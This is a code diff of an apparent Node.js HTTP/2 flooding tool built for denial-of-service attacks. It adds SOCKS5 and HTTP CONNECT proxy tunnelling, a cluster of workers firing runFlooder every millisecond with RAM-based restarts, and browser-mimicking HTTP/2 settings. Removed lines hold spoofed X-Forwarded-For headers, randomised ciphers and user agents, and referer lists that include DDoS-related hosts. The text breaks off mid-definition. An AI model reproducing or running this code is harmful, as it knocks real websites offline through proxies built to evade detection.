-  "https://developers.google.com/speed/pagespeed/insights/?url=",
-  "https://drive.google.com/viewerng/viewer?url=",
-  "https://duckduckgo.com/?q=",
-  "https://google.com/",
-  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
-  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
-  "https://help.baidu.com/searchResult?keywords=",
-  "https://play.google.com/store/search?q=",
-  "https://pornhub.com/",
-  "https://r.search.yahoo.com/",
-  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-  "https://steamcommunity.com/market/search?q=",
-  "https://vk.com/profile.php?redirect=",
-  "https://www.bing.com/search?q=",
-  "https://www.cia.gov/index.html",
-  "https://www.facebook.com/",
-  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
-  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
-  "https://www.fbi.com/",
-  "https://www.google.ad/search?q=",
-  "https://www.google.ae/search?q=",
-  "https://www.google.al/search?q=",
-  "https://www.google.co.ao/search?q=",
-  "https://www.google.com.af/search?q=",
-  "https://www.google.com.ag/search?q=",
-  "https://www.google.com.ai/search?q=",
-  "https://www.google.com/search?q=",
-  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
-  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
-  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
-  "https://www.npmjs.com/search?q=",
-  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
-  "https://www.pinterest.com/search/?q=",
-  "https://www.qwant.com/search?q=",
-  "https://www.ted.com/search?q=",
-  "https://www.usatoday.com/search/results?q=",
-  "https://www.yandex.com/yandsearch?text=",
-  "https://www.youtube.com/",
-  "https://yandex.ru/",
-    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
-    'http://coccoc.com/search#query=',
-    'http://ddosvn.somee.com/f5.php?v=',
-    'http://engadget.search.aol.com/search?q=',
-    'http://engadget.search.aol.com/search?q=query?=query=&q=',
-    'http://eu.battle.net/wow/en/search?q=',
-    'http://filehippo.com/search?q=',
-    'http://funnymama.com/search?q=',
-    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
-    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
-    'http://go.mail.ru/search?mail.ru=1&q=',
-    'http://help.baidu.com/searchResult?keywords=',
-    'http://host-tracker.com/check_page/?furl=',
-    'http://itch.io/search?q=',
-    'http://jigsaw.w3.org/css-validator/validator?uri=',
-    'http://jobs.bloomberg.com/search?q=',
-    'http://jobs.leidos.com/search?q=',
-    'http://jobs.rbs.com/jobs/search?q=',
-    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
-    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
-    'http://millercenter.org/search?q=',
-    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
-    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
-    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
-    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
-    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
-    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
-    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
-    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
-    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
-    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
-    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
-    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
-    'http://search.aol.com/aol/search?q=',
-    'http://taginfo.openstreetmap.org/search?q=',
-    'http://techtv.mit.edu/search?q=',
-    'http://validator.w3.org/feed/check.cgi?url=',
-    'http://vk.com/profile.php?redirect=',
-    'http://www.ask.com/web?q=',
-    'http://www.baoxaydung.com.vn/news/vn/search&q=',
-    'http://www.bestbuytheater.com/events/search?q=',
-    'http://www.bing.com/search?q=',
-    'http://www.evidence.nhs.uk/search?q=',
-    'http://www.google.com/?q=',
-    'http://www.google.com/translate?u=',
-    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
-    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
-    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
-    'http://www.pagescoring.com/website-speed-test/?url=',
-    'http://www.reddit.com/search?q=',
-    'http://www.search.com/search?q=',
-    'http://www.shodanhq.com/search?q=',
-    'http://www.ted.com/search?q=',
-    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
-    'http://www.usatoday.com/search/results?q=',
-    'http://www.ustream.tv/search?q=',
-    'http://yandex.ru/yandsearch?text=',
-    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
-    'http://ytmnd.com/search?q=',
-    'https://add.my.yahoo.com/rss?url=',
-    'https://careers.carolinashealthcare.org/search?q=',
-    'https://check-host.net/',
-    'https://developers.google.com/speed/pagespeed/insights/?url=',
-    'https://drive.google.com/viewerng/viewer?url=',
-    'https://duckduckgo.com/?q=',
-    'https://google.com/',
-    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
-    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
-    'https://help.baidu.com/searchResult?keywords=',
-    'https://play.google.com/store/search?q=',
-    'https://pornhub.com/',
-    'https://r.search.yahoo.com/',
-    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
-    'https://steamcommunity.com/market/search?q=',
-    'https://vk.com/profile.php?redirect=',
-    'https://www.bing.com/search?q=',
-    'https://www.cia.gov/index.html',
-    'https://www.facebook.com/',
-    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
-    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
-    'https://www.fbi.com/',
-    'https://www.google.ad/search?q=',
-    'https://www.google.ae/search?q=',
-    'https://www.google.al/search?q=',
-    'https://www.google.co.ao/search?q=',
-    'https://www.google.com.af/search?q=',
-    'https://www.google.com.ag/search?q=',
-    'https://www.google.com.ai/search?q=',
-    'https://www.google.com/search?q=',
-    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
-    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
-    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
-    'https://www.npmjs.com/search?q=',
-    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
-    'https://www.pinterest.com/search/?q=',
-    'https://www.qwant.com/search?q=',
-    'https://www.ted.com/search?q=',
-    'https://www.usatoday.com/search/results?q=',
-    'https://www.yandex.com/yandsearch?text=',
-    'https://www.youtube.com/',
-    'https://yandex.ru/',
-    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',
- ];
- const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
- const ciphers1 = "GREASE:" + [
-     defaultCiphers[2],
-     defaultCiphers[1],
-     defaultCiphers[0],
-     ...defaultCiphers.slice(3)
- ].join(":");
- 
- const uap = [
-     "Mozilla/5.0 (Linux; Android 9; CPH2015 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.72 Mobile Safari/537.36 GoogleApp/15.9.51.28.arm64",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-     "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.100 Mobile Safari/537.36 GoogleApp/15.20.39.28.arm64",
-       "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
-  "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
-  "portalmmm/2.0 N410i(c20;TB) ",
-  "Python-urllib/2.5",
-  "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
-  "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
-  "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
-  "SearchExpress",
-  "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
-  "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
-  "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
-  "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
-  "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonT100/R101",
-  "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
-  "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
-  "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
-  "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
-  "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
-  "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
-  "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
-  "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonT68/R201A",
-  "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
-  "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
-  "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
-  "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
-  "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
-  "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
-  "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
-  "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
-  "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
-  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
-  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
- ];
-
- var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
- var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
- var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
- var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
- var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
- var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
- var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
- var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
  var proxies = readLines(args.proxyFile);
- const parsedTarget = url.parse(args.target);
- 
-      if (cluster.isMaster) {
-        for (let counter = 1; counter <= args.threads; counter++) {
-          cluster.fork();
-        }
-      } else {
-        setInterval(runFlooder);
-      };
- 
+ const parsedTarget = url.parse(args.target); 
  class NetSocket {
      constructor(){}
  
+     async SOCKS5(options, callback) {
+
+      const address = options.address.split(':');
+      socks.createConnection({
+        proxy: {
+          host: options.host,
+          port: options.port,
+          type: 5
+        },
+        command: 'connect',
+        destination: {
+          host: address[0],
+          port: +address[1]
+        }
+      }, (error, info) => {
+        if (error) {
+          return callback(undefined, error);
+        } else {
+          return callback(info.socket, undefined);
+        }
+      });
+     }
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
      const buffer = new Buffer.from(payload);
- 
      const connection = net.connect({
-         host: options.host,
-         port: options.port
-     });
- 
-     //connection.setTimeout(options.timeout * 600000);
-     connection.setTimeout(options.timeout * 100000);
-     connection.setKeepAlive(true, 100000);
- 
-     connection.on("connect", () => {
-         connection.write(buffer);
-     });
- 
-     connection.on("data", chunk => {
-         const response = chunk.toString("utf-8");
-         const isAlive = response.includes("HTTP/1.1 200");
-         if (isAlive === false) {
-             connection.destroy();
-             return callback(undefined, "error: invalid response from proxy server");
-         }
-         return callback(connection, undefined);
-     });
- 
-     connection.on("timeout", () => {
-         connection.destroy();
-         return callback(undefined, "error: timeout exceeded");
-     });
- 
-     connection.on("error", error => {
-         connection.destroy();
-         return callback(undefined, "error: " + error);
-     });
- }
- }
+        host: options.host,
+        port: options.port,
+    });
+
+    connection.setTimeout(options.timeout * 100000);
+    connection.setKeepAlive(true, 100000);
+    connection.setNoDelay(true)
+    connection.on("connect", () => {
+       connection.write(buffer);
+   });
+
+   connection.on("data", chunk => {
+       const response = chunk.toString("utf-8");
+       const isAlive = response.includes("HTTP/1.1 200");
+       if (isAlive === false) {
+           connection.destroy();
+           return callback(undefined, "error: invalid response from proxy server");
+       }
+       return callback(connection, undefined);
+   });
+
+   connection.on("timeout", () => {
+       connection.destroy();
+       return callback(undefined, "error: timeout exceeded");
+   });
+
+}
+}
+
 
  const Socker = new NetSocket();
- headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- headers["X-Forwarded-For"] = spoofed;
- headers["X-Forwarded-Host"] = spoofed;
- headers["Real-IP"] = spoofed;
- headers["cache-control"] = control;
- headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
- headers["origin"] = "https://" + parsedTarget.host;
- headers["referer"] = "https://" + parsedTarget.host;
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = randstr(15);
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "none";
- headers["TE"] = "trailers";
- headers["Trailer"] = "Max-Forwards";
- headers["sec-fetch-user"] = "?1";
- headers["x-requested-with"] = "XMLHttpRequest";
  
- function runFlooder() {
-     const proxyAddr = randomElement(proxies);
-     const parsedProxy = proxyAddr.split(":"); 
-	 //headers[":authority"] = parsedTarget.host;
-         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
-         headers["origin"] = "https://" + parsedTarget.host;
+ function readLines(filePath) {
+     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+ }
+ const MAX_RAM_PERCENTAGE = 95;
+const RESTART_DELAY = 1000;
 
-     const proxyOptions = {
-         host: parsedProxy[0],
-         port: ~~parsedProxy[1],
-         address: parsedTarget.host + ":443",
-         timeout: 100,
-     };
+ if (cluster.isMaster) {
+    const restartScript = () => {
+        for (const id in cluster.workers) {
+            cluster.workers[id].kill();
+        }
 
-     Socker.HTTP(proxyOptions, (connection, error) => {
-         if (error) return
- 
-         connection.setKeepAlive(true, 600000);
+        //console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
+        setTimeout(() => {
+            for (let counter = 1; counter <= args.threads; counter++) {
+                cluster.fork();
+            }
+        }, RESTART_DELAY);
+    };
 
-         const tlsOptions = {
-            host: parsedTarget.host,
-            port: 443,
-            secure: true,
-            ALPNProtocols: ['http/1.1', 'h2', 'http/2'],
-            sigals: siga,
-            socket: connection,
-            ciphers: tls.getCiphers().join(":") + cipper,
-            ecdhCurve: "prime256v1:X25519",
-            host: parsedTarget.host,
-            rejectUnauthorized: false,
-            servername: parsedTarget.host,
-            secureProtocol: "TLS_method",
-        };
+    const handleRAMUsage = () => {
+        const totalRAM = os.totalmem();
+        const usedRAM = totalRAM - os.freemem();
+        const ramPercentage = (usedRAM / totalRAM) * 100;
 
-         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
+            //console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
+            restartScript();
+        }
+    };
+	setInterval(handleRAMUsage, 5000);
+	
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
+} else {
+	setInterval(runFlooder,1)
+}
+  function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
+function randstr(length) {
+    const characters = "0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+};
+const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
 
-         tlsConn.setKeepAlive(true, 60000);
+const getRandomBrowser = () => {
+    const randomIndex = Math.floor(Math.random() * browsers.length);
+    return browsers[randomIndex];
+};
 
-         const client = http2.connect(parsedTarget.href, {
-             protocol: "https:",
-             settings: {
-            headerTableSize: 65536,
-            maxConcurrentStreams: 2000,
-            initialWindowSize: 65535,
-            maxHeaderListSize: 65536,
-            enablePush: false
-          },
-             maxSessionMemory: 64000,
-             maxDeflateDynamicTableSize: 4294967295,
-             createConnection: () => tlsConn,
-             socket: connection,
-         });
- 
-         client.settings({
-            headerTableSize: 65536,
-            maxConcurrentStreams: 2000,
-            initialWindowSize: 6291456,
-            maxHeaderListSize: 65536,
-            enablePush: false
-          });
- 
-         client.on("connect", () => {
-            const IntervalAttack = setInterval(() => {
+const transformSettings = (settings) => {
+    const settingsMap = {
+        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
+        "SETTINGS_ENABLE_PUSH": 0x2,
+        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
+        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
+        "SETTINGS_MAX_FRAME_SIZE": 0x5,
+        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
+    };
+    return settings.map(([key, value]) => [settingsMap[key], value]);
+};
+
+const h2Settings = (browser) => {
+    const settings = {
+        brave: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        chrome: [
